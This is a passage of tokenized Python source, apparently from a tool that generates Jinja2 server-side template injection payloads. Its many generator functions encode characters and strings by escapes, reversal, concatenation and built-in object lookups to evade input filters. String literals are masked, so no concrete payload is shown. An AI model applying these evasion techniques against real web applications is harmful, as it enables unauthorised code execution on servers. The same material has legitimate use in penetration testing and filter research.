) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( STRING_UNDERLINE , ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( STRING_UNDERLINE , ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , targets ) ] <EOL> @ expression_gen <EOL> def gen_string_many_format_c_complex ( context , num ) : <EOL> fomat_c_target_list = [ <EOL> ( <EOL> LITERAL , <EOL> ( <EOL> "<STR_LIT>" <EOL> + "<STR_LIT>" <EOL> ) , <EOL> ) , <EOL> ( STRING_LOWERC , ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> return [ <EOL> ( <EOL> MULTIPLY , <EOL> ( EXPRESSION , precedence [ "<STR_LIT>" ] , fomat_c_target_list ) , <EOL> ( INTEGER , num ) , <EOL> ) <EOL> ] <EOL> @ expression_gen <EOL> def gen_char_literal1 ( context , c ) : <EOL> target_list = [ ( LITERAL , f"<STR_LIT>" if c != "<STR_LIT>" else "<STR_LIT>" ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_char_literal2 ( context , c ) : <EOL> target_list = [ ( LITERAL , f'<STR_LIT>' if c != '<STR_LIT>' else '<STR_LIT>' ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_char_underline ( context , c ) : <EOL> target_list = [ ( UNSATISFIED , ) ] if c != "<STR_LIT>" else [ ( STRING_UNDERLINE , ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_char_percent ( context , c ) : <EOL> target_list = [ ( UNSATISFIED , ) ] if c != "<STR_LIT>" else [ ( STRING_PERCENT , ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_char_selectpy3 ( context , c ) : <EOL> matches = [ ] <EOL> for pattern , d in CHAR_PATTERNS . items ( ) : <EOL> for index_str , value in d . items ( ) : <EOL> if value == c : <EOL> matches . append ( [ ( LITERAL , pattern . replace ( "<STR_LIT>" , index_str ) ) ] ) <EOL> if not matches : <EOL> return [ ( UNSATISFIED , ) ] <EOL> target_list = [ ( ONEOF , * matches ) ] <EOL> return [ ( REQUIRE_PYTHON3 , ) , ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_char_selectpy2 ( context , c ) : <EOL> matches = [ ] <EOL> for pattern , d in CHAR_PATTERNS . items ( ) : <EOL> if "<STR_LIT>" in pattern : <EOL> continue <EOL> for index_str , value in d . items ( ) : <EOL> if value == c : <EOL> matches . append ( [ ( LITERAL , pattern . replace ( "<STR_LIT>" , index_str ) ) ] ) <EOL> if not matches : <EOL> return [ ( UNSATISFIED , ) ] <EOL> target_list = [ ( ONEOF , * matches ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_char_flaskg ( context , c ) : <EOL> d = { <EOL> <NUM_LIT> : "<STR_LIT>" , <EOL> <NUM_LIT> : "<STR_LIT>" , <EOL> <NUM_LIT> : "<STR_LIT>" , <EOL> <NUM_LIT> : "<STR_LIT>" , <EOL> <NUM_LIT> : "<STR_LIT>" , <EOL> <NUM_LIT> : "<STR_LIT>" , <EOL> <NUM_LIT> : "<STR_LIT>" , <EOL> <NUM_LIT> : "<STR_LIT>" , <EOL> <NUM_LIT> : "<STR_LIT>" , <EOL> <NUM_LIT> : "<STR_LIT>" , <EOL> <NUM_LIT> : "<STR_LIT>" , <EOL> <NUM_LIT> : "<STR_LIT>" , <EOL> <NUM_LIT> : "<STR_LIT>" , <EOL> <NUM_LIT> : "<STR_LIT>" , <EOL> } <EOL> matches = [ ] <EOL> pattern = "<STR_LIT>" <EOL> for index , value in d . items ( ) : <EOL> if value == c : <EOL> matches . append ( [ ( FLASK_CONTEXT_VAR , "<STR_LIT>" ) , ( LITERAL , pattern . replace ( "<STR_LIT>" , str ( index ) ) ) ] ) <EOL> target_list = [ ( ONEOF , * matches ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_char_dict ( context , c ) : <EOL> if not re . match ( "<STR_LIT>" , c ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> target_list = [ ( LITERAL , f"<STR_LIT>" ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_char_namespacedict ( context , c ) : <EOL> if not re . match ( "<STR_LIT>" , c ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> target_list = [ ( LITERAL , f"<STR_LIT>" ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_char_num ( context , c ) : <EOL> if not re . match ( "<STR_LIT>" , c ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> target_list = [ <EOL> ( INTEGER , int ( c ) ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_char_num2 ( context , c ) : <EOL> if not re . match ( "<STR_LIT>" , c ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> target_list = [ <EOL> ( <EOL> LITERAL , <EOL> "<STR_LIT>" , <EOL> ) , <EOL> ( INTEGER , int ( c ) ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_char_lipsumdoc ( context , c ) : <EOL> lipsum_doc = <EOL> if c not in lipsum_doc : <EOL> return [ ( UNSATISFIED , ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ <EOL> ( JINJA_CONTEXT_VAR , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( VARIABLE_OF , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( INTEGER , lipsum_doc . index ( c ) ) , <EOL> ( LITERAL , "<STR_LIT>" ) <EOL> ] ) ] <EOL> @ expression_gen <EOL> def gen_char_cyclerdoc ( cotext , c ) : <EOL> doc = <EOL> alternatives = [ ] <EOL> for i , ch in enumerate ( doc ) : <EOL> if ch == c : <EOL> alternatives += [ <EOL> [ ( LITERAL , f"<STR_LIT>" ) ] , <EOL> [ ( LITERAL , f"<STR_LIT>" ) ] , <EOL> ] <EOL> if len ( alternatives ) > <NUM_LIT> : <EOL> break <EOL> target_list = [ ( ONEOF , * alternatives ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_char_cycledoc2 ( context , c ) : <EOL> doc = <EOL> if c not in doc : <EOL> return [ ( UNSATISFIED , ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ <EOL> ( JINJA_CONTEXT_VAR , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( VARIABLE_OF , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( INTEGER , doc . index ( c ) ) , <EOL> ( LITERAL , "<STR_LIT>" ) <EOL> ] ) ] <EOL> @ expression_gen <EOL> def gen_char_format ( cotext , c ) : <EOL> if ord ( c ) > <NUM_LIT> : <EOL> return [ ( UNSATISFIED , ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ <EOL> ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , ( STRING_PERCENT_LOWER_C , ) ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , ( INTEGER , ord ( c ) ) ) <EOL> ] ) ] <EOL> @ expression_gen <EOL> def gen_string_1 ( context : dict , value : str ) : <EOL> chars = [ str_escape ( c , "<STR_LIT>" ) for c in value ] <EOL> target_list = [ ( LITERAL , "<STR_LIT>" . format ( "<STR_LIT>" . join ( chars ) ) ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_2 ( context : dict , value : str ) : <EOL> chars = [ str_escape ( c , '<STR_LIT>' ) for c in value ] <EOL> target_list = [ ( LITERAL , '<STR_LIT>' . format ( "<STR_LIT>" . join ( chars ) ) ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_manypercentlowerc ( context : dict , value : str ) : <EOL> if value . replace ( "<STR_LIT>" , "<STR_LIT>" ) != "<STR_LIT>" or len ( value ) == "<STR_LIT>" : <EOL> return [ ( UNSATISFIED , ) ] <EOL> return [ ( STRING_MANY_PERCENT_LOWER_C , value . count ( "<STR_LIT>" ) ) ] <EOL> @ expression_gen <EOL> def gen_string_twostringconcat ( context : dict , value : str ) : <EOL> if len ( value ) <= <NUM_LIT> or len ( value ) > <NUM_LIT> : <EOL> return [ ( UNSATISFIED , ) ] <EOL> target_list = [ <EOL> ( <EOL> ONEOF , <EOL> * [ <EOL> [ <EOL> ( LITERAL , "<STR_LIT>" . format ( str_escape ( value [ : i ] , "<STR_LIT>" ) ) ) , <EOL> ( LITERAL , "<STR_LIT>" . format ( str_escape ( value [ i : ] , "<STR_LIT>" ) ) ) , <EOL> ] <EOL> for i in range ( <NUM_LIT> , len ( value ) - <NUM_LIT> ) <EOL> ] , <EOL> ) , <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_twostringconcat2 ( context : dict , value : str ) : <EOL> if len ( value ) <= <NUM_LIT> or len ( value ) > <NUM_LIT> : <EOL> return [ ( UNSATISFIED , ) ] <EOL> target_list = [ <EOL> ( <EOL> ONEOF , <EOL> * [ <EOL> [ <EOL> ( LITERAL , '<STR_LIT>' . format ( str_escape ( value [ : i ] , '<STR_LIT>' ) ) ) , <EOL> ( LITERAL , '<STR_LIT>' . format ( str_escape ( value [ i : ] , '<STR_LIT>' ) ) ) , <EOL> ] <EOL> for i in range ( <NUM_LIT> , len ( value ) - <NUM_LIT> ) <EOL> ] , <EOL> ) , <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_context ( context : dict , value : str ) : <EOL> if value not in context . values ( ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> vs = [ k for k , v in context . items ( ) if v == value ] <EOL> alternatives = [ [ ( LITERAL , v ) ] + [ ( WITH_CONTEXT_VAR , v ) ] for v in vs ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ ( ONEOF , * alternatives ) ] ) ] <EOL> @ expression_gen <EOL> def gen_string_dunder ( context : dict , value : str ) : <EOL> if value != "<STR_LIT>" : <EOL> return [ ( UNSATISFIED , ) ] <EOL> return [ ( STRING_TWOUNDERLINE , ) ] <EOL> @ expression_gen <EOL> def gen_string_removedunder ( context : dict , value : str ) : <EOL> if not re . match ( "<STR_LIT>" , value ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> twounderline = ( MULTIPLY , ( STRING_UNDERLINE , ) , ( INTEGER , <NUM_LIT> ) ) <EOL> middle = ( STRING , value [ <NUM_LIT> : - <NUM_LIT> ] ) <EOL> return [ <EOL> ( <EOL> STRING_CONCATMANY , <EOL> [ <EOL> twounderline , <EOL> middle , <EOL> twounderline , <EOL> ] , <EOL> ) <EOL> ] <EOL> @ expression_gen <EOL> def gen_string_removedunder2 ( context : dict , value : str ) : <EOL> if not re . match ( "<STR_LIT>" , value ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> strings = [ <EOL> ( STRING_UNDERLINE , ) , <EOL> ( STRING_UNDERLINE , ) , <EOL> ( STRING , value [ <NUM_LIT> : - <NUM_LIT> ] ) , <EOL> ( STRING_UNDERLINE , ) , <EOL> ( STRING_UNDERLINE , ) , <EOL> ] <EOL> return [ ( STRING_CONCATMANY , strings ) ] <EOL> @ expression_gen <EOL> def gen_string_removedunder3 ( context : dict , value : str ) : <EOL> if not re . match ( "<STR_LIT>" , value ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> tofmt = "<STR_LIT>" + value [ <NUM_LIT> : - <NUM_LIT> ] + "<STR_LIT>" <EOL> targets = [ <EOL> ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , ( STRING , tofmt ) ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , ( STRING , "<STR_LIT>" ) ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , ( STRING , "<STR_LIT>" ) ) , <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , targets ) ] <EOL> @ expression_gen <EOL> def gen_string_removedunder4 ( context : dict , value : str ) : <EOL> if not re . match ( "<STR_LIT>" , value ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> tofmt = "<STR_LIT>" + value [ <NUM_LIT> : - <NUM_LIT> ] + "<STR_LIT>" <EOL> targets = [ <EOL> ( ENCLOSE_UNDER , precedence [ "<STR_LIT>" ] , ( STRING , tofmt ) ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( STRING , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( STRING , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , targets ) ] <EOL> @ expression_gen <EOL> def gen_string_reverse1 ( context : dict , value : str ) : <EOL> chars = [ str_escape ( c , "<STR_LIT>" ) for c in value ] <EOL> target_list = [ ( LITERAL , "<STR_LIT>" . format ( "<STR_LIT>" . join ( chars [ : : - <NUM_LIT> ] ) ) ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_reverse2 ( context : dict , value : str ) : <EOL> chars = [ str_escape ( c , '<STR_LIT>' ) for c in value ] <EOL> target_list = [ ( LITERAL , '<STR_LIT>' . format ( "<STR_LIT>" . join ( chars [ : : - <NUM_LIT> ] ) ) ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_lower1 ( context : dict , value : str ) : <EOL> if value . upper ( ) . lower ( ) != value : <EOL> return [ ( UNSATISFIED , ) ] <EOL> chars = [ str_escape ( c , "<STR_LIT>" ) for c in value . upper ( ) ] <EOL> target_list = [ ( LITERAL , "<STR_LIT>" . format ( "<STR_LIT>" . join ( chars ) ) ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_lower2 ( context : dict , value : str ) : <EOL> if value . upper ( ) . lower ( ) != value : <EOL> return [ ( UNSATISFIED , ) ] <EOL> chars = [ str_escape ( c , '<STR_LIT>' ) for c in value . upper ( ) ] <EOL> target_list = [ ( LITERAL , '<STR_LIT>' . format ( "<STR_LIT>" . join ( chars ) ) ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_lower3 ( context : dict , value : str ) : <EOL> if value . upper ( ) . lower ( ) != value : <EOL> return [ ( UNSATISFIED , ) ] <EOL> chars = [ str_escape ( c , "<STR_LIT>" ) for c in value . upper ( ) ] <EOL> target_list = [ ( LITERAL , "<STR_LIT>" . format ( "<STR_LIT>" . join ( chars ) ) ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_lower4 ( context : dict , value : str ) : <EOL> if value . upper ( ) . lower ( ) != value : <EOL> return [ ( UNSATISFIED , ) ] <EOL> chars = [ str_escape ( c , '<STR_LIT>' ) for c in value . upper ( ) ] <EOL> target_list = [ ( LITERAL , '<STR_LIT>' . format ( "<STR_LIT>" . join ( chars ) ) ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_lowerfilter1 ( context : dict , value : str ) : <EOL> if value . upper ( ) . lower ( ) != value : <EOL> return [ ( UNSATISFIED , ) ] <EOL> chars = [ str_escape ( c , "<STR_LIT>" ) for c in value . upper ( ) ] <EOL> target_list = [ ( LITERAL , "<STR_LIT>" . format ( "<STR_LIT>" . join ( chars ) ) ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_lowerfilter2 ( context : dict , value : str ) : <EOL> if value . upper ( ) . lower ( ) != value : <EOL> return [ ( UNSATISFIED , ) ] <EOL> chars = [ str_escape ( c , '<STR_LIT>' ) for c in value . upper ( ) ] <EOL> target_list = [ ( LITERAL , '<STR_LIT>' . format ( "<STR_LIT>" . join ( chars ) ) ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_lowerfilterdict1 ( context : dict , value : str ) : <EOL> if value . upper ( ) . lower ( ) != value or not re . match ( <EOL> r"<STR_LIT>" , value <EOL> ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> chars = [ str_escape ( c , '<STR_LIT>' ) for c in value . upper ( ) ] <EOL> target_list = [ ( LITERAL , "<STR_LIT>" . format ( "<STR_LIT>" . join ( chars ) ) ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_lowerfilterdict2 ( context : dict , value : str ) : <EOL> if value . upper ( ) . lower ( ) != value or not re . match ( <EOL> r"<STR_LIT>" , value <EOL> ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> chars = [ str_escape ( c , '<STR_LIT>' ) for c in value . upper ( ) ] <EOL> target_list = [ ( LITERAL , "<STR_LIT>" . format ( "<STR_LIT>" . join ( chars ) ) ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_concat1 ( context : dict , value : str ) : <EOL> target_list = [ <EOL> ( <EOL> LITERAL , <EOL> "<STR_LIT>" . join ( "<STR_LIT>" . format ( str_escape ( c , "<STR_LIT>" ) ) for c in value ) , <EOL> ) <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_concat2 ( context : dict , value : str ) : <EOL> target_list = [ <EOL> ( <EOL> LITERAL , <EOL> "<STR_LIT>" . join ( '<STR_LIT>' . format ( str_escape ( c , '<STR_LIT>' ) ) for c in value ) , <EOL> ) <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_concat3 ( context : dict , value : str ) : <EOL> target_list = [ ( LITERAL , "<STR_LIT>" . join ( '<STR_LIT>' . format ( str_escape ( c , '<STR_LIT>' ) ) for c in value ) ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_concat4 ( context : dict , value : str ) : <EOL> target_list = [ ( LITERAL , "<STR_LIT>" . join ( '<STR_LIT>' . format ( str_escape ( c , '<STR_LIT>' ) ) for c in value ) ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_dictjoin ( context : dict , value : str ) : <EOL> if not re . match ( "<STR_LIT>" , value ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> target_list = [ ( LITERAL , "<STR_LIT>" . format ( value ) ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_dictfirst ( context : dict , value : str ) : <EOL> if not re . match ( "<STR_LIT>" , value ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> target_list = [ ( LITERAL , "<STR_LIT>" . format ( value ) ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_dictfirstreverse ( context : dict , value : str ) : <EOL> if not re . match ( "<STR_LIT>" , value ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> target_list = [ ( LITERAL , "<STR_LIT>" . format ( value [ : : - <NUM_LIT> ] ) ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_x1 ( context : dict , value : str ) : <EOL> if any ( ord ( c ) >= <NUM_LIT> for c in value ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> target = "<STR_LIT>" . join ( "<STR_LIT>" + hex ( ord ( c ) ) [ <NUM_LIT> : ] for c in value ) <EOL> target_list = [ ( LITERAL , '<STR_LIT>' . format ( target ) ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_x2 ( context : dict , value : str ) : <EOL> if any ( ord ( c ) >= <NUM_LIT> for c in value ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> target = "<STR_LIT>" . join ( "<STR_LIT>" + hex ( ord ( c ) ) [ <NUM_LIT> : ] for c in value ) <EOL> target_list = [ ( LITERAL , "<STR_LIT>" . format ( target ) ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_u1 ( context : dict , value : str ) : <EOL> if any ( ord ( c ) >= <NUM_LIT> for c in value ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> target = "<STR_LIT>" . join ( "<STR_LIT>" + hex ( ord ( c ) ) [ <NUM_LIT> : ] for c in value ) <EOL> target_list = [ ( LITERAL , "<STR_LIT>" . format ( target ) ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_u2 ( context : dict , value : str ) : <EOL> if any ( ord ( c ) >= <NUM_LIT> for c in value ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> target = "<STR_LIT>" . join ( "<STR_LIT>" + hex ( ord ( c ) ) [ <NUM_LIT> : ] for c in value ) <EOL> target_list = [ ( LITERAL , "<STR_LIT>" . format ( target ) ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_o1 ( context : dict , value : str ) : <EOL> if any ( ord ( c ) >= <NUM_LIT> for c in value ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> target = "<STR_LIT>" . join ( "<STR_LIT>" + oct ( ord ( c ) ) [ <NUM_LIT> : ] for c in value ) <EOL> target_list = [ ( LITERAL , "<STR_LIT>" . format ( target ) ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_o2 ( context : dict , value : str ) : <EOL> if any ( ord ( c ) >= <NUM_LIT> for c in value ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> target = "<STR_LIT>" . join ( "<STR_LIT>" + oct ( ord ( c ) ) [ <NUM_LIT> : ] for c in value ) <EOL> target_list = [ ( LITERAL , "<STR_LIT>" . format ( target ) ) ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_lowerfilternamespaceattrs1 ( context : dict , value : str ) : <EOL> if value . upper ( ) . lower ( ) != value or not re . match ( <EOL> r"<STR_LIT>" , value <EOL> ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> chars = [ str_escape ( c , '<STR_LIT>' ) for c in value . upper ( ) ] <EOL> target_list = [ <EOL> ( <EOL> LITERAL , <EOL> "<STR_LIT>" . format ( "<STR_LIT>" . join ( chars ) ) , <EOL> ) <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_lowerfilternamespaceattrs2 ( context : dict , value : str ) : <EOL> if value . upper ( ) . lower ( ) != value or not re . match ( <EOL> r"<STR_LIT>" , value <EOL> ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> chars = [ str_escape ( c , '<STR_LIT>' ) for c in value . upper ( ) ] <EOL> target_list = [ <EOL> ( LITERAL , "<STR_LIT>" . format ( "<STR_LIT>" . join ( chars ) ) ) <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_splitdictjoin ( context : dict , value : str ) : <EOL> if not re . match ( "<STR_LIT>" , value ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> parts = [ value [ i : i + <NUM_LIT> ] for i in range ( <NUM_LIT> , len ( value ) , <NUM_LIT> ) ] <EOL> if len ( set ( parts ) ) != len ( parts ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> target_list = [ <EOL> ( LITERAL , "<STR_LIT>" . format ( "<STR_LIT>" . join ( f"<STR_LIT>" for part in parts ) ) ) <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) , ( REQUIRE_PYTHON3 , ) ] <EOL> @ expression_gen <EOL> def gen_string_splitdictjoin2 ( context : dict , value : str ) : <EOL> if not re . match ( "<STR_LIT>" , value ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> parts = [ value [ i : i + <NUM_LIT> ] for i in range ( <NUM_LIT> , len ( value ) , <NUM_LIT> ) ] <EOL> targets = [ ( LITERAL , "<STR_LIT>" . format ( part ) ) for part in parts ] <EOL> strings = [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ target ] ) for target in targets ] <EOL> return [ ( STRING_CONCATMANY , strings ) , ( REQUIRE_PYTHON3 , ) ] <EOL> @ expression_gen <EOL> def gen_string_splitdictjoin3 ( context : dict , value : str ) : <EOL> if not re . match ( "<STR_LIT>" , value ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> if len ( set ( value ) ) != len ( value ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> target_list = [ <EOL> ( LITERAL , "<STR_LIT>" . format ( "<STR_LIT>" . join ( f"<STR_LIT>" for part in value ) ) ) <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) , ( REQUIRE_PYTHON3 , ) ] <EOL> @ expression_gen <EOL> def gen_string_splitnamespacedictjoin ( context : dict , value : str ) : <EOL> if not re . match ( "<STR_LIT>" , value ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> parts = [ value [ i : i + <NUM_LIT> ] for i in range ( <NUM_LIT> , len ( value ) , <NUM_LIT> ) ] <EOL> if len ( set ( parts ) ) != len ( parts ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> target_list = [ <EOL> ( <EOL> LITERAL , <EOL> "<STR_LIT>" . format ( <EOL> "<STR_LIT>" . join ( f"<STR_LIT>" for part in parts ) <EOL> ) , <EOL> ) <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_splitnamespacedictjoin2 ( context : dict , value : str ) : <EOL> if not re . match ( "<STR_LIT>" , value ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> parts = [ value [ i : i + <NUM_LIT> ] for i in range ( <NUM_LIT> , len ( value ) , <NUM_LIT> ) ] <EOL> targets = [ <EOL> ( LITERAL , "<STR_LIT>" . format ( part ) ) <EOL> for part in parts <EOL> ] <EOL> strings = [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , [ target ] ) for target in targets ] <EOL> return [ ( STRING_CONCATMANY , strings ) ] <EOL> @ expression_gen <EOL> def gen_string_splitnamespacedictjoin3 ( context : dict , value : str ) : <EOL> if not re . match ( "<STR_LIT>" , value ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> if len ( set ( value ) ) != len ( value ) : <EOL> return [ ( UNSATISFIED , ) ] <EOL> target_list = [ <EOL> ( <EOL> LITERAL , <EOL> "<STR_LIT>" . format ( <EOL> "<STR_LIT>" . join ( f"<STR_LIT>" for part in value ) <EOL> ) , <EOL> ) <EOL> ] <EOL> return [ ( EXPRESSION , precedence [ "<STR_LIT>" ] , target_list ) ] <EOL> @ expression_gen <EOL> def gen_string_lipsumtobytes4 ( context : dict , value : str ) : <EOL> value_tpl = ( <EOL> [ ( LITERAL , "<STR_LIT>" ) ] <EOL> + join_target ( sep = ( LITERAL , "<STR_LIT>" ) , targets = [ ( INTEGER , ord ( c ) ) for c in value ] ) <EOL> + [ ( LITERAL , "<STR_LIT>" ) ] <EOL> ) <EOL> bytes_targets_noendbracket = [ <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( VARIABLE_OF , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( VARIABLE_OF , "<STR_LIT>" ) , <EOL> ( LITERAL , "<STR_LIT>" ) , <EOL> ( 